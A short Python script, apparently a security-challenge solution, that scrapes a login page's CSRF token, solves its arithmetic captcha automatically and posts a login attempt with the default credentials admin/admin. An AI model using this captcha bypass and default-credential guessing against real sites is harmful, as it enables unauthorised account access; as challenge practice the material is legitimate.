import requests
from bs4 import BeautifulSoup as bs

head= { 'Content-Type':'application/x-www-form-urlencoded',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
}

login_url = 'https://afeladat2017.whiteshield.net/login'
s = requests.session()
r = s.get(login_url)
print(r.content)
print("#####################################")

cookies = r.cookies
head['X-Requested-With'] = 'XMLHttpRequest'
head['Referer'] = login_url

soup = bs(r.content, 'html5lib')
nevid=soup.find('input', attrs = {'id':'id_username'}) 
passid=soup.find('input', attrs = {'id':'id_password'}) 
kapcsa=str(soup.find('span', attrs = {'id':'math'}))
kapcsa=kapcsa.replace('<span id="math">','')
kapcsa=kapcsa.replace('=</span>','')
kapcsanull=str(soup.find('input', attrs = {'id':'id_captcha_0'}))
kapcsanull=kapcsanull.replace('<input id="id_captcha_0" name="captcha_0" type="hidden" value="','')
kapcsanull=kapcsanull.replace('"/>','')

csrfmiddlew=str(soup.find('input', attrs = {'name':'csrfmiddlewaretoken'}))
csrfmiddlew=csrfmiddlew.replace('<input name="csrfmiddlewaretoken" type="hidden" value="','')
csrfmiddlew=csrfmiddlew.replace('"/>','')

result=0
if int(kapcsa.find("+"))>-1:
    result=int(kapcsa.split("+")[0])+int(kapcsa.split("+")[1])
if int(kapcsa.find("-"))>-1:
    result=int(kapcsa.split("-")[0])-int(kapcsa.split("-")[1])
if int(kapcsa.find("/"))>-1:
    result=int(kapcsa.split("/")[0])/int(kapcsa.split("/")[1])
if int(kapcsa.find("*"))>-1:
    result=int(kapcsa.split("*")[0])*int(kapcsa.split("*")[1])

nevid="admin"
passid="admin"
payload = {
'id_username':nevid,
'id_password':passid,
'id_captcha_1':result,
'id_captcha_0':kapcsanull,
'csrfmiddlewaretoken' : csrfmiddlew
}

r = s.post(login_url, data=payload, headers=head)
soup = bs(r.content, 'html5lib')
print(soup)
print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
print(nevid,passid,payload,result)








